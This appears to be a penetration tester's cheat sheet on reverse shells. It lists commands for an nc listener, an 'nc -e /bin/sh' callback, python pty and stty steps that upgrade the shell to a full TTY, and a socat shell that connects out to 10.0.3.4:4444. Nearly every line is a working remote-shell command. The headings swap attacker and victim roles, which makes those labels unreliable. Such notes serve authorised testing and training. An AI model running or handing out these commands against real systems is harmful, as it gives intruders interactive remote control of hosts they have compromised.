### Resources
https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

http://pentestmonkey.net/blog/post-exploitation-without-a-tty
***
### Reverse Shells

##### Set up listener on victim LHOST with nc 
    nc -nvlp <open_port>

##### Execute reverse shell on attacker RHOST with nc -e
    nc -e /bin/sh <LHOST> <LPORT>

***

### Upgrade to pseudo interactive shell with python
    python -c 'import pty; pty.spawn("/bin/bash")'

##### Upgrade to fully interactive shell by matching term settings after python shell
* nc listener shell has to start in bash, not zsh


    ctrl-z
    echo $TERM 
    stty -a | grep cols
    stty raw -echo
    fg
    reset
    export SHELL=bash
    export TERM=xterm256-color
    stty rows 38 columns 160


***
### Upgrade to better shell with socat
##### Listener
    socat file: 'tty',raw,echo=0 tcp-listen:4444

##### Victim
    socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.3.4:4444



